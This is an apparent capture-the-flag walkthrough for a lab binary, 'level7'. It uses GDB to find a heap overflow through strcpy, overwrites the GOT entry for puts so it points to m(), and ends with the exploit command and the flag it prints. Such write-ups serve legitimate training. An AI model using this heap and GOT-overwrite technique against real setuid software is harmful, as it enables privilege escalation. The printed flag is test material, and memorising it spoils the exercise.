# Level 7 Walkthrough

1. **Connect to the target machine**

	```bash
	ssh level7@<vm-ip> -p 4242
	```

2. **Check the files**

	```bash
	ls -l
	```

	Output:

	```
	-rwsr-s---+ 1 level8 users 5138 Mar  6  2016 level7
	```

3. **Test the binary**

	```bash
	./level7
	```

	Output

	```
	Segmentation fault (core dumped)
	```

4. **Copy the binary locally for analysis**

	```bash
	scp -P 4242 level7@<vm-ip>:/home/user/level7/level7 .
	```

5. **Analyze with GDB**

	```bash
	gdb level7
	(gdb) p m
	```

	Output:

	```
	$1 = {<text variable, no debug info>} 0x80484f4 <m>
	```

	**Main function disassembly** shows:

	* Multiple `malloc(8)` calls creating small heap chunks.
	* Two structures each containing:

		* An integer
		* A pointer to another allocation
	* `strcpy()` is called twice:

		1. First on the pointer inside the first structure.
		2. Second on the pointer inside the second structure.
	* Finally, `puts()` is called — through the **GOT entry** at `0x8049928`.

	This means we can **overwrite the GOT entry for `puts()`** to point to our target function `m()`.

6. **Addresses of interest**

	```bash
	(gdb) x/i 0x8048400
	```

	Output:

	```
	0x8048400 <puts@plt>:  jmp *0x8049928
	```

	So:

	* GOT entry for `puts`: `0x8049928`
	* Address of `m()`: `0x080484f4`

7. **Calculate overflow offset**

	Memory layout for the first structure:

	* `int` (4 bytes)
	* `pointer` (4 bytes) → points to second allocation
	* `malloc(8)` block (8 bytes) containing target pointer

	We want to overwrite the pointer inside the first structure so it points to the GOT entry of `puts`.

	Offset calculation:

	```
	24 bytes total - 4 bytes (for the pointer we overwrite) = 20 bytes
	```

8. **Build and execute exploit**

	We pass two arguments:

	* First: fills buffer, overwrites pointer with GOT address
	* Second: new function pointer (address of `m()`)

	```bash
	./level7 $(printf 'A%.0s' {1..20}; printf '\x28\x99\x04\x08') $(printf '\xf4\x84\x04\x08')
	```

	Output:

	```
	5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
	 - 1755121534
	```
